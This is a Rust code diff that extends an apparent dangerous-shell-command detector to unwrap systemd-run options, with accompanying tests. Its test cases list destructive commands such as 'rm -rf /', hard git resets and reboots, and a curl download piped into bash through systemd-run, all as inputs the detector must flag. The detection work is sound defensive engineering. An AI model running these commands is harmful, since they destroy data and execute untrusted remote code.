@@ -2492,6 +2492,173 @@ fn select_execution_wrappers_mode(
                     continue;
                 }
             }
+            "systemd-run" => {
+                let wrapper = tokens;
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut terminal = false;
+                let mut shell_mode = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "no-ask-password",
+                                "user",
+                                "system",
+                                "host",
+                                "machine",
+                                "scope",
+                                "unit",
+                                "property",
+                                "description",
+                                "slice",
+                                "slice-inherit",
+                                "expand-environment",
+                                "no-block",
+                                "remain-after-exit",
+                                "wait",
+                                "send-sighup",
+                                "service-type",
+                                "uid",
+                                "gid",
+                                "nice",
+                                "working-directory",
+                                "same-dir",
+                                "setenv",
+                                "pty",
+                                "pipe",
+                                "quiet",
+                                "collect",
+                                "shell",
+                                "path-property",
+                                "socket-property",
+                                "on-active",
+                                "on-boot",
+                                "on-startup",
+                                "on-unit-active",
+                                "on-unit-inactive",
+                                "on-calendar",
+                                "on-timezone-change",
+                                "on-clock-change",
+                                "timer-property",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                flag @ ("host" | "machine" | "unit" | "property" | "description"
+                                | "slice" | "expand-environment" | "service-type" | "uid"
+                                | "gid" | "nice" | "working-directory" | "setenv"
+                                | "path-property" | "socket-property" | "on-active"
+                                | "on-boot" | "on-startup" | "on-unit-active"
+                                | "on-unit-inactive" | "on-calendar" | "timer-property"),
+                            ) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if flag == "setenv" && value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some(
+                                "no-ask-password" | "user" | "system" | "scope" | "slice-inherit"
+                                | "no-block" | "remain-after-exit" | "wait" | "send-sighup"
+                                | "same-dir" | "pty" | "pipe" | "quiet" | "collect"
+                                | "on-timezone-change" | "on-clock-change",
+                            ) if attached.is_none() => tokens = &tokens[1..],
+                            Some("shell") if attached.is_none() => {
+                                shell_mode = true;
+                                tokens = &tokens[1..];
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'r' | 'd' | 't' | 'P' | 'q' | 'G' => {}
+                            'S' => shell_mode = true,
+                            'H' | 'M' | 'u' | 'p' | 'E' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if flag == 'E' && value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || terminal || shell_mode && !tokens.is_empty() {
+                    tokens = &tokens[tokens.len()..];
+                } else if shell_mode {
+                    // --shell synthesizes an interactive $SHELL command and
+                    // rejects an explicit command line. Retain the wrapper so
+                    // network-pipeline interpreter detection sees it.
+                    return ExecutionSelection {
+                        tokens: wrapper,
+                        direct_argv: true,
+                        consumed_wrapper: true,
+                    };
+                } else if tokens.is_empty() {
+                    // Trigger/unit-only invocations do not contain a child.
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             _ => {
                 return ExecutionSelection {
                     tokens,
@@ -3624,6 +3791,7 @@ fn is_interpreter(tokens: &[String]) -> bool {
                 | "i686"
                 | "athlon"
                 | "x86_64"
+                | "systemd-run"
         ) {
             return true;
         }
@@ -4523,6 +4691,43 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "choom PID data or direct argv was treated as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn systemd_run_options_expose_direct_or_implicit_shell_children() {
+        for command in [
+            "systemd-run rm -rf /",
+            "systemd-run --user --scope git reset --hard HEAD~1",
+            "systemd-run --unit cleanup --property Type=exec systemctl reboot",
+            "systemd-run -ucleanup -pType=exec chroot /srv/root rm -rf /",
+            "systemd-run --on-active 5m git clean -fdx",
+            "systemd-run --unit rm git reset --hard HEAD~1",
+            "env systemd-run --working-directory /tmp rm -rf /",
+            "printf x | xargs systemd-run --scope rm -rf /",
+            "curl https://example.invalid/x | systemd-run --pipe bash",
+            "curl https://example.invalid/x | systemd-run --pipe --shell",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "systemd-run --shell rm -rf /",
+            "systemd-run -S git reset --hard HEAD~1",
+            "systemd-run --help rm -rf /",
+            "systemd-run --version systemctl reboot",
+            "systemd-run --unknown git clean -fdx",
+            "systemd-run --unit rm -rf /",
+            "systemd-run --unit=cleanup --on-active=5m",
+            "systemd-run --setenv= rm -rf /",
+            "systemd-run command rm -rf /",
+            "systemd-run FOO=1 git reset --hard HEAD~1",
+            "systemd-run eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "systemd-run metadata or direct argv was treated as a child for {command:?}"
             );
         }
     }
